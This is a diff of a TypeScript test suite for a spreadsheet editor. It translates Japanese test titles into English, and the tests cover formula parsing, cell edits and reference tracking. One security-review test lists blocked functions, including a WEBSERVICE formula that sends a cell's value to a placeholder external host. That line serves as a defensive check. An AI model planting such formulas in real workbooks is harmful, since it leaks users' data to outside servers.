@@ -28,8 +28,8 @@ import { excelSerialToDate } from '../plugins/aios.office/viewer/workbook.js'
 
 const SHEET = 'xl/worksheets/sheet1.xml'
 
-describe('番地', () => {
-  it('parseRef / formatRef は往復し、範囲の外は null', () => {
+describe('cell addresses', () => {
+  it('parseRef / formatRef round-trip, and out of range is null', () => {
     expect(parseRef('B2')).toEqual({ row: 1, col: 1 })
     expect(parseRef('$XFD$1048576')).toEqual({ row: 1_048_575, col: 16_383 })
     expect(parseRef('XFE1')).toBeNull()
@@ -41,17 +41,17 @@ describe('番地', () => {
   })
 })
 
-describe('下書きの形', () => {
+describe('draft shape', () => {
   const edit = (ref: string, value: CellEdit['value']): CellEdit => ({ sheet: SHEET, ref, value })
 
-  it('編集が無ければ空文字列、同じセルは最後が勝つ', () => {
+  it('an empty string when there are no edits, and for the same cell the last one wins', () => {
     expect(serializeCellEdits([])).toBe('')
     const text = serializeCellEdits([edit('A1', { t: 'n', v: 1 }), edit('B1', { t: 's', v: 'x' }), edit('A1', { t: 'b', v: true })])
     expect(parseCellEdits(text)).toEqual([edit('A1', { t: 'b', v: true }), edit('B1', { t: 's', v: 'x' })])
     expect(parseCellEdits('')).toEqual([])
   })
 
-  it('形のおかしい下書きは全体を null にする (一部だけ書かない)', () => {
+  it('a malformed draft makes the whole thing null (does not write only part)', () => {
     const wrap = (edits: unknown): string => JSON.stringify({ format: CELL_EDITS_FORMAT, edits })
     expect(parseCellEdits('not json')).toBeNull()
     expect(parseCellEdits(JSON.stringify({ format: 'other', edits: [] }))).toBeNull()
@@ -73,7 +73,7 @@ describe('下書きの形', () => {
 
 describe('parseCellInput', () => {
   const plain = { date: false, date1904: false, sheetNames: ['Data', 'My Sheet'] }
-  it('数・真偽・文字列・空・逃がし・数式', () => {
+  it('numbers, booleans, strings, empty, escapes, formulas', () => {
     expect(parseCellInput('12', plain)).toEqual({ ok: true, value: { t: 'n', v: 12 } })
     expect(parseCellInput(' -3.5e2 ', plain)).toEqual({ ok: true, value: { t: 'n', v: -350 } })
     expect(parseCellInput('true', plain)).toEqual({ ok: true, value: { t: 'b', v: true } })
@@ -89,7 +89,7 @@ describe('parseCellInput', () => {
     expect(parseCellInput('2026-11-13', plain)).toEqual({ ok: true, value: { t: 's', v: '2026-11-13' } })
   })
 
-  it('日付の書式のセルは日付・時刻を通し番号にし、表示 (excelSerialToDate) と往復する', () => {
+  it('a date-formatted cell turns a date or time into a serial number and round-trips with the display (excelSerialToDate)', () => {
     const r = parseCellInput('2026/11/13 9:30', { date: true, date1904: false, sheetNames: [] })
     expect(r.ok).toBe(true)
     if (!r.ok || r.value.t !== 'n') throw new Error('number')
@@ -103,7 +103,7 @@ describe('parseCellInput', () => {
   })
 })
 
-describe('normalizeFormulaInput (TODO 1212 段 2)', () => {
+describe('normalizeFormulaInput (TODO 1212 stage 2)', () => {
   const ok = (input: string): string => {
     const r = normalizeFormulaInput(input)
     if (!r.ok) throw new Error(`${input}: ${r.reason}`)
@@ -114,7 +114,7 @@ describe('normalizeFormulaInput (TODO 1212 段 2)', () => {
     return r.ok ? null : r.reason
   }
 
-  it('関数名・番地・真偽は大文字に、2010 以降の関数は _xlfn. を付ける。文字列とシート名の中は触らない', () => {
+  it('function names, addresses, and booleans are uppercased, functions from 2010 onward get _xlfn.; does not touch inside strings and sheet names', () => {
     expect(ok('sum(a1:b2)+$c$3')).toBe('SUM(A1:B2)+$C$3')
     expect(ok('xlookup(a1,b:b,c:c)')).toBe('_xlfn.XLOOKUP(A1,B:B,C:C)')
     expect(ok('_xlfn.IFS(a1>1,"x",true,"y")')).toBe('_xlfn.IFS(A1>1,"x",TRUE,"y")')
@@ -132,7 +132,7 @@ describe('normalizeFormulaInput (TODO 1212 段 2)', () => {
     expect(ok(ok('textjoin(",",true,a1:a3)'))).toBe('_xlfn.TEXTJOIN(",",TRUE,A1:A3)')
   })
 
-  it('壊れた式・断る形', () => {
+  it('broken formulas and refused shapes', () => {
     for (const bad of ['SUM(A1', 'SUM(A1))', '"abc', "'Sheet!A1", '1+', '*2', 'A1 2', ',A1', 'A1,B1', '()', '(1)(2)', 'F(1;2)', '{1,}', '2abc', 'A1!B1!C1']) {
       expect([bad, reason(bad)]).toEqual([bad, expect.stringMatching(/^formula/)])
     }
@@ -150,7 +150,7 @@ describe('normalizeFormulaInput (TODO 1212 段 2)', () => {
     expect(reason('A1:B2 B1:C3')).toBe('formulaUnsupportedRef')
   })
 
-  it('引用符の要るシート名は、引用符なしなら断り、引用符付きなら通す (TODO 1212 の直し)', () => {
+  it('a sheet name that needs quotes is refused without quotes and passes with quotes (fix for TODO 1212)', () => {
     for (const name of ['2024', '1Q', 'A1', 'AB12', 'R1C1', 'R2C3', 'RC', 'R', 'C']) {
       expect([name, reason(`${name}!B2`)]).toEqual([name, 'formulaSyntax'])
       expect(ok(`'${name}'!B2`)).toBe(`'${name}'!B2`)
@@ -160,7 +160,7 @@ describe('normalizeFormulaInput (TODO 1212 段 2)', () => {
     expect(ok('Data!B2')).toBe('Data!B2')
   })
 
-  it('関数名は許可の表だけ: 外へ通信する・外のコードを呼ぶ・利用者定義・知らない関数は formulaFunction (セキュリティレビュー)', () => {
+  it('function names only from the allow table: functions that communicate outside, call outside code, user-defined, or unknown are formulaFunction (security review)', () => {
     for (const bad of [
       'WEBSERVICE("https://x.example/?"&A1)',
       '_xlfn.WEBSERVICE("https://x.example/")',
@@ -188,12 +188,12 @@ describe('normalizeFormulaInput (TODO 1212 段 2)', () => {
     expect(parseCellEdits(udf)).toBeNull()
   })
 
-  it('参照しているシート名を返す', () => {
+  it('returns the sheet names referenced', () => {
     const r = normalizeFormulaInput("Data!A1+'It''s'!B2+SUM(x!A:A)")
     expect(r.ok && r.sheets).toEqual(['Data', "It's", 'x'])
   })
 
-  it('displayFormula は表にある関数の _xlfn. を外し、normalizeFormulaInput で元に戻る', () => {
+  it('displayFormula removes _xlfn. from functions in the table, and normalizeFormulaInput restores it', () => {
     const file = '_xlfn.XLOOKUP(A1,B:B,C:C)&_xlfn.STDEV.S(1)&"_xlfn.IFS("'
     const shown = displayFormula(file)
     expect(shown).toBe('XLOOKUP(A1,B:B,C:C)&STDEV.S(1)&"_xlfn.IFS("')
@@ -204,7 +204,7 @@ describe('normalizeFormulaInput (TODO 1212 段 2)', () => {
 })
 
 describe('workbookSignature', () => {
-  it('文書の署名とマクロの署名を分ける', () => {
+  it('separates the document signature from the macro signature', () => {
     expect(workbookSignature(['xl/workbook.xml', 'xl/vbaProject.bin'])).toBeNull()
     expect(workbookSignature(['xl/vbaProject.bin', 'xl/vbaProjectSignature.bin'])).toBe('signedMacro')
     expect(workbookSignature(['xl/vbaProjectSignatureAgile.bin'])).toBe('signedMacro')
@@ -213,7 +213,7 @@ describe('workbookSignature', () => {
 })
 
 describe('formulaReferences', () => {
-  it('セル・範囲・列・行・シート名付き (引用符・数字始まり) を拾う', () => {
+  it('picks up cells, ranges, columns, rows, and sheet-qualified ones (quoted, starting with a digit)', () => {
     const r = formulaReferences(`SUM(A1:B2)+$C$3+Sheet2!D4+'My Sheet'!E5:E6+SUM(F:F)+SUM(2:3)+'2024年'!A1`)
     expect(r.opaque).toBe(false)
     expect(r.refs.map((ref) => [ref.sheet, ref.range])).toEqual([
@@ -227,13 +227,13 @@ describe('formulaReferences', () => {
     ])
   })
 
-  it('文字列の中・関数名・数・真偽は参照にしない', () => {
+  it('does not treat things inside strings, function names, numbers, or booleans as references', () => {
     const r = formulaReferences('IF(TRUE,"A1"&LOG10(100),1.5E+3)')
     expect(r.refs).toEqual([])
     expect(r.opaque).toBe(false)
   })
 
-  it('定義名・構造化参照・外部参照・INDIRECT・3D 参照は読めない (opaque)', () => {
+  it('defined names, structured references, external references, INDIRECT, and 3D references cannot be read (opaque)', () => {
     expect(formulaReferences('Tax*2').opaque).toBe(true)
     expect(formulaReferences('SUM(Table1[Amount])').opaque).toBe(true)
     expect(formulaReferences('[1]Sheet1!A1').opaque).toBe(true)
@@ -242,7 +242,7 @@ describe('formulaReferences', () => {
     expect(formulaReferences('SUM(Sheet1:Sheet3!A1)').opaque).toBe(true)
   })
 
-  it('共有数式の子は相対の片だけ動く', () => {
+  it('the child of a shared formula moves only the relative part', () => {
     const parent = formulaReferences('A2*$B$1+C$1')
     const shifted = shiftReferences(parent.refs, 3, 1)
     expect(shifted.map((ref) => ref.range)).toEqual([
@@ -261,7 +261,7 @@ describe('staleFormulaCells', () => {
     ...formulaReferences(formula)
   })
 
-  it('直接・間接に依存する数式だけ、シート名は大小を問わない', () => {
+  it('only formulas that depend directly or indirectly, with sheet names case-insensitive', () => {
     const formulas = [
       cell('S', 1, 3, 'B2*C2'), // D2 ← B2
       cell('S', 4, 3, 'SUM(D2:D4)'), // D5 ← D2
@@ -275,15 +275,15 @@ describe('staleFormulaCells', () => {
     expect(staleFormulaCells(formulas, []).size).toBe(0)
   })
 
-  it('読めない参照の数式は、何か 1 つ変われば古い (控えめに倒す)', () => {
+  it('a formula with an unreadable reference is stale if anything changes (errs on the cautious side)', () => {
     const stale = staleFormulaCells([cell('S', 0, 0, 'Tax*2'), cell('S', 0, 1, 'A1+1')], [{ sheet: 'S', row: 50, col: 50 }])
     expect(stale.has(formulaCellKey('S', 0, 0))).toBe(true)
     expect(stale.has(formulaCellKey('S', 0, 1))).toBe(true)
   })
 })
 
-describe('自動保存の待ち時間', () => {
-  it('セルの値の下書きだけ下限を掛ける', () => {
+describe('autosave wait time', () => {
+  it('applies a lower bound only to cell value drafts', () => {
     expect(autoSaveDelayFor(1000, false)).toBe(1000)
     expect(autoSaveDelayFor(1000, true)).toBe(CELL_EDITS_MIN_AUTO_SAVE_DELAY_MS)
     expect(autoSaveDelayFor(10_000, true)).toBe(10_000)
